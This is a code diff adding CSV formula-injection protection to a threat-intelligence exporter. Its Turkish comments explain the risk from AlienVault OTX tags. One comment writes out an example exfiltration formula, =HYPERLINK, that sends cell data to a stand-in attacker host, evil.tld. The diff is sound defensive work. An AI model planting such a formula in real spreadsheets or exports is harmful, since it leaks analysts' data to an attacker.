@@ -85,6 +85,42 @@ _THREAT_INTEL_HEADER: Final[tuple[str, ...]] = (
 
 _STATISTICS_HEADER: Final[tuple[str, ...]] = ("category", "key", "value")
 
+# GÜVENLİK: CSV formül enjeksiyonu (CWE-1236). Excel/LibreOffice, bir hücrenin
+# içeriği bu karakterlerden biriyle başlıyorsa onu VERİ değil FORMÜL olarak
+# değerlendirir. `csv.writer` bu duruma karşı koruma sağlamaz -- yalnızca
+# tırnaklar, elektronik tablo ise tırnağı ayrıştırma sırasında zaten kaldırır.
+#
+# Bu çıktıdaki hücrelerin bir kısmı dış kaynaklıdır: `categories` sütunu
+# AlienVault OTX'in pulse etiketlerinden gelir ve bunlar topluluk tarafından
+# yazılan SERBEST METİNDİR. Ücretsiz bir OTX hesabı açan saldırgan, kendi
+# IP'sini içeren bir pulse'a `=HYPERLINK("https://evil.tld/?d="&A1,"Aç")` gibi
+# bir etiket koyup o IP ile trafik üretirse, capture'ı analiz eden kişi CSV'yi
+# Excel'de açtığında formül çalışır: adli tablodaki veri saldırganın sunucusuna
+# sızdırılabilir ya da DDE ile komut çalıştırma istemi gösterilebilir.
+#
+# Sanitizasyon tek tek sütunlara değil, `_write_csv` içinde TÜM hücrelere
+# uygulanır: böylece bugün güvenli olan sütunlar (ör. IP ile başlayan
+# `description`) ileride değişse ya da yeni bir sütun eklense bile koruma
+# kendiliğinden geçerli olur -- güvenlik tesadüfe değil kurguya bağlansın.
+_FORMULA_TRIGGER_PREFIXES: Final[tuple[str, ...]] = ("=", "+", "-", "@", "\t", "\r")
+
+# Tek tırnak öneki elektronik tablolarda "bunu metin olarak ele al" anlamına
+# gelir ve hücre görüntülenirken gösterilmez. Değer SİLİNMEZ, yalnızca
+# etkisizleştirilir; adli çıktıda kanıtın kaybolmaması bundan daha önemlidir.
+_FORMULA_ESCAPE_PREFIX: Final[str] = "'"
+
+
+def _defuse_formula(value: Any) -> Any:
+    """Elektronik tablonun formül olarak yorumlayacağı hücreleri etkisizleştirir.
+
+    Sayısal değerler (int/float) dokunulmadan geçer: bunlar zaten metin
+    olarak yazılmaz ve negatif bir sayının başındaki "-" işaretini kaçırmak
+    veriyi bozardı (-5 sayısı "'-5" metnine dönüşürdü).
+    """
+    if not isinstance(value, str) or not value.startswith(_FORMULA_TRIGGER_PREFIXES):
+        return value
+    return _FORMULA_ESCAPE_PREFIX + value
+
 
 def _epoch_to_iso(epoch: float | None) -> str:
     """Epoch zamanı, saat dilimi ofseti taşıyan ISO 8601 metnine çevirir.
@@ -157,7 +193,12 @@ class CSVExporter(Exporter):
             with output_path.open("w", encoding=_CSV_ENCODING, newline="") as handle:
                 writer = csv.writer(handle)
                 writer.writerow(header)
-                writer.writerows(rows)
+                # Her hücre tek bir noktadan geçer (bkz. _defuse_formula):
+                # sanitizasyonu satır üreten metotlara bırakmak, yeni bir
+                # sütun eklendiğinde unutulmaya açık olurdu.
+                writer.writerows(
+                    [_defuse_formula(cell) for cell in row] for row in rows
+                )
         except OSError as exc:
             raise ExportError(f"CSV çıktısı yazılamadı: {output_path} ({exc})") from exc
         return output_path
